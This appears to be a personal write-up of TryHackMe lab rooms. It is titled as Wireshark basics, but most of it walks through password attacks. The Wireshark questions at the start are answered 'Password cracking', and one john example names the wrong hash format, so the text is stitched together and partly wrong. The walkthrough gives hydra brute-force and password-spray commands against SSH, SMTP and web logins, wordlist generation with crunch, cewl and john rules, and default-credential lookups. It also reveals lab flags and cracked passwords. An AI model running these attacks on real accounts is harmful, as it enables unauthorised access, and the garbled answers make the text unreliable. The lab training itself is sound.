# [Wireshark: The Basics](https://tryhackme.com/room/wiresharkthebasics) [Easy]
### Learn the basics of Wireshark and how to analyse protocols and PCAPs.


## [TASK 1] Introduction
Wireshark is an open-source, cross-platform network packet analyser tool capable of sniffing and investigating live traffic and inspecting packet captures (PCAP). It is commonly used as one of the best packet analysis tools. In this room, we will look at the basics of Wireshark and use it to perform fundamental packet analysis.

### Which file is used to simulate the screenshots?
#### Answer: http1.pcapng

### Which file is used to answer the questions?
#### Answer: Exercise.pcapng


## [TASK 2] Tool Overview 
Why wireshark?
Network administrators use it to troubleshoot network problems
Network security engineers use it to examine security problems
QA engineers use it to verify network applications
Developers use it to debug protocol implementations
People use it to learn network protocol internals 

#### Read the "capture file comments". What is the flag?
#### Answer: Password cracking

#### What is the total number of packets?
To find all packets you can scroll down or just open Statistics->Capture File Properties
![Screenshot_20220808_062328](https://user-images.githubusercontent.com/86546994/183318015-079f9a9b-d752-43c1-b176-45714a6a9f4d.png) 

#### Answer: Password cracking

#### What is the SHA256 hash value of the capture file?
#### Answer: Password cracking

## [TASK 3] Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists
#### Default passwords
Sometimes it's good practice to use the default password to break into a service. A default password is a standard pre-configured password for a device. Such passwords are the default configuration for many devices and, if unchanged, present a serious security risk. Examples: admin, 123, root. Very often the default password is found in routers and virtual machines. Website that provide default passwords: https://cirt.net/passwords

#### Weak Passwords
A weak password is short, common, a system default, or something that could be rapidly guessed by executing a brute force attack using a subset of all possible passwords, such as words in the dictionary, proper names, words based on the user name or common variations on these themes.

#### Leaked Passwords
Leaked password database is an aggregated collection of login credentials known to have been exposed. As new breaches and leaks occur, security researchers work to discover data breaches to add and process compromised credentials. Famous rockyou.txt comes from data breach occured in December 2009, when the company "RockYou" experienced a data breach resulting in the exposure of over 32 million user accounts. There are many different sites where you can check for leaked passwords. https://www.avast.com/hackcheck#pc

#### Combined wordlists
To crack passwords, it is sometimes useful to combine word lists in a way that concatenates words from multiple lists. More information about combined wordlists in the article - https://www.sjoerdlangkemper.nl/2020/04/29/combine-two-word-lists-for-cracking-passwords/

#### Customized Wordlists
Beginners learning brute-forcing attacks against WPA handshakes are often let down by the limitations of default wordlists like RockYou based on stolen passwords. The science of brute-forcing goes beyond using these default lists, allowing us to be more efficient by making customized wordlists. There are a number of options for creating wordlists besides a simple dictionary, and the one we'll explore today is Common User Passwords Profiler (or CUPP). A lightweight, simple Python program, CUPP is capable of generating an impressive seed of personalized password guesses. Other tools, like CeWL, allow for target websites to be scraped for unique words in order to use words that are common across the organization. Information how to create custom wodlists with CeWL - https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-5-creating-custom-wordlist-with-cewl-0158855/

#### Username Wordlists
Very often, users use their names or initials as logins and passwords. Once you have users, you can use the tools by creating your own list of usernames. Doing it manually would be a waste of time, instead we can use a ready-made tool written in python, here is the link - https://github.com/shroudri/username_generator

#### What is the Juniper Networks ISG 2000 default password?
Visit the website with default passwords list https://default-password.info/ and search for Juniper. Go to ISG2000 directory and press "show me" button.

![Screenshot_20220504_170722](https://user-images.githubusercontent.com/86546994/166671711-05747d68-e29f-495d-baea-1ea570d75825.png)

#### Answer: netscreen:netscreen


## [TASK 4] Password Profiling #2 - Keyspace Technique and CUPP
#### Keyspace Technique
What can we do in case when we want to create a wordlists which wil depend on specified rules like: range of characters, numbers, symbols, digits. Helpfull utility for us will be crunch. Crunch is a wordlist generator where you can specify a standard character set or any set of characters to be used in generating the wordlists. The wordlists are created through combination and permutation of a set of characters. You can determine the amount of characters and list size. Here some examples of using crunch - https://www.geeksforgeeks.org/kali-linux-crunch-utility/

#### CUPP - Common User Passwords Profiler
UPP tool is an automated script written in the python language that interacts with the user and answers some fundamental questions about the victim like Name, Company Name, Partner’s Name, etc. After analyzing these answers, the CUPP tool generates some possible Usernames+Password words that attackers can use for various attacks like Password Cracking and Brute-Forcing. More information - https://www.geeksforgeeks.org/cupp-common-user-passwords-profiler/

#### Run the following crunch command:crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate?
After running `crunch 2 2 01234abcd -o crunch.txt` command we will see crunch.txt text file. To count generated words in crunch.txt we can use `wc` command with `-w` option
![Screenshot_20220504_181136](https://user-images.githubusercontent.com/86546994/166678770-dabd1469-20f2-4eb0-998a-8709c5ed0565.png)
#### Answer: 81

#### What is the crunch command to generate a list containing THM@! and output to a filed named tryhackme.txt?

In order to specify `@` charachter in a list, we should follow this options:
`    , for all uppercase letters
    @ for all lowercase letters
    % for all numeric characters
    ^ for all special characters`
`5 5` -> represents the length of generated words
`-t` option -> to use specific pattern

![Screenshot_20220504_183221](https://user-images.githubusercontent.com/86546994/166684097-d4691e3e-cc1a-41cf-8836-41b9bd6cd90d.png)

#### Answer: crunch 5 5 -t "THM^! " -o tryhackme.txt

## [TASK 5] Offline Attacks - Dictionary and Brute-Force
#### Dictionary attack
A dictionary attack is a method of guessing password by systematically entering every word in a dictionary as a password. 

#### Brute-Force attack
A brute force attack uses trial-and-error to guess login info, encryption keys, or find a hidden web page. This method is used to guess the victim's password by sending standard password combinations.

Usefull tools: hashcat, john the ripper

#### Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the hash type?
To identify hash type we can use different tools, I prefer to use `hash id`. You can download it from github - https://github.com/blackploit/hash-identifier.
Type `python3 hash-id.py` and paste hash

![Screenshot_20220504_185846](https://user-images.githubusercontent.com/86546994/166686381-cb0bfa3c-29e2-4c55-a56e-53fd58e19087.png)

#### Answer: SHA-1

#### Perform a dictionary attack against the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the cracked value? Use rockyou.txt wordlist.

To perform dictionary attack firstly we need to identify hash type. We already know, that hash type is `SHA-1`.
Let's use `John the ripper`, here the simple usage

john --wordlist=[path to wordlist file] --format=[hash format] [path to hash]
Can save our hash in hash1.txt
echo '8d6e34f987851aa599257d3831a1af040886842f' > hash1.txt
Now, we have txt file with hash and we know hash format, we can run `john the ripper`

`john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash1.txt`

![Screenshot_20220505_182055](https://user-images.githubusercontent.com/86546994/166921724-54a7d397-99db-4a2e-9f25-5e4940c6f649.png)

P.s if you crack this hash first time, result will appear in terminal. After cracking same hash will show no result. To see, type john --show=[hash format] [path to hash]

#### Answer: sunshine

#### Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9]

Let's john the ripper again. You know steps, just reminder!

1. Save hash to txt file

2. Identify hash type

3. Run the command `john --wordlist=[path to wordlist file] --format=[hash format] [path to hash]`

![Screenshot_20220505_182734](https://user-images.githubusercontent.com/86546994/166922763-aa8b976a-93fa-4ebe-b562-c7f9fa32d429.png)

#### Answer: 1337

## [TASK 6] Offline Attacks - Rule-Based
#### Rule-Based
A rule-based password attack is a way of focusing a password cracking technique when an attacker knows which rules passwords in a particular system are based on, such as alphanumeric and eight characters long.
For this attack, we can use either hashcat or John the ripper.

`Az represents a single word from the original wordlist/dictionary using -p.

"[0-9]" append a single digit (from 0 to 9) to the end of the word. For two digits, we can add "[0-9][0-9]"  and so on.  

^[!@#$] add a special character at the beginning of each word. ^ means the beginning of the line/word. Note, changing ^ to $ will append the special characters to the end of the line/word.`

#### What would the syntax you would use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@? 

#### Answer:  Az"[0-9][0-9]" ^[!@]

#### [TASK 7] Deploy the VM
`cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/` run to create custom wordlit

#### [TASK 8] Online password attacks 
Online password attacks include procesess of guessing password of networked services like SSH, SNMP, FTP, POP3 and etc.

For this tasks we will use famous `Hydra` tool.

#### FTP
`hydra -L [path to username.txt] -P [path to password.txt] ftp://[IP]`

#### SMTP
`hydra -L [path to username.txt] -P [path to password.txt] smtp://[IP]`

#### SSH
`hydra -L [path to username.txt] -P [path to password.txt] ssh://[IP] -v`


#### Can you guess the FTP credentials without brute-forcing? What is the flag?
Go to website with default password lists - https://datarecovery.com/rd/default-passwords/
Here we need to find username and password related to ftp.
There are different default password, try all of them!

![Screenshot_20220505_195359](https://user-images.githubusercontent.com/86546994/166938685-82849f8a-9bfe-4dd7-9ae7-bbc8b4b701d8.png)

username: ftp and password: ftp looks suitable.

![Screenshot_20220505_195545](https://user-images.githubusercontent.com/86546994/166938885-8ead3aaf-232f-4758-ae79-f01d5d3e9c85.png)

After connection, go to `Files` directory and type `get flag.txt` to copy file to your local machine.

#### Answer THM{d0abe799f25738ad739c20301aed357b}


#### In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against 10.10.200.112:25 (SMTP).
#### What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9].

We know how to create rules-based dictionary using `john the ripper`.

In /etc/john/john.conf we should write our created rule


![Screenshot_20220512_181354](https://user-images.githubusercontent.com/86546994/168072289-5d3fb40e-f8aa-4777-8b4d-be3a59b37aa5.png)

Now, we can create a wordlist using our wordlist 

`john --wordlist=clinic.lst --rules=[Rule name] --stdout > [File where you want to save]`

run the bruteforce attack using generated password

`hydra -l pittman@clinic.thmredteam.com -P [generated list] smtp://[IP]:25`

#### ANSWER: !multidisciplinary00

#### Perform a brute-forcing attack against the phillips account for the login page at http://10.10.187.109/login-get using hydra? What is the flag?

as a password list, we gonna use clinic.lst
Here you can more about brute forcing login pages - https://russianblogs.com/article/1635894923/
`hydra -l phillips -P clinic.lst 10.10.6.182 http-get-form "/login-get/index.php:username=phillips&password=^PASS^:S=logout.php" -f`

#### ANSWER: Paracetamol

#### Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://10.10.6.182/login-post/. What is the flag?

#### Note: use the clinic.lst dictionary in generating and expanding the wordlist!

we should crate new list using default john the ripper rule - Single-Extra
`john --wordlist=clinic.lst --rules=Single-Extra --stdout > [File where you want to save]`
And run the command
`hydra -l burgess -P generated list [IP] http-post-form "/login-post/index.php:username=burgess&password=^PASS^:S=logout.php" -f`

#### Answer: OxytocinnicotyxO

#### [TASK 9] Password spray attack 
In this attack, an attacker will brute force logins based on list of usernames with default passwords on the application. For example, an attacker will use one password (say, Secure@123) against many different accounts on the application to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.

#### Perform a password spraying attack to get access to the SSH://10.10.6.182 server to read /etc/flag. What is the flag?

The password format is season+ year + special character, so we need to randomly choose passwords and try to login
First, lets create a file with usernames like
admin
victim
dummy
adm
sammy
phillips
burgess

And now, try to login with random pass
`hydra -L [username list] -p Fall2021@ ssh://[IP]`

After some tries, find that password is Fall2021@

![Screenshot_20220515_135551](https://user-images.githubusercontent.com/86546994/168463016-179560bd-3e37-4f46-a022-25f260f8a377.png)

#### Answer: THM{a97a26e86d09388bbea148f4b870277d}

#### [TASK 10] Summary
Topics of this room
    Default, weak, leaked combined wordlists
    Password profiling
    Offline password attacks
    Online password attacks

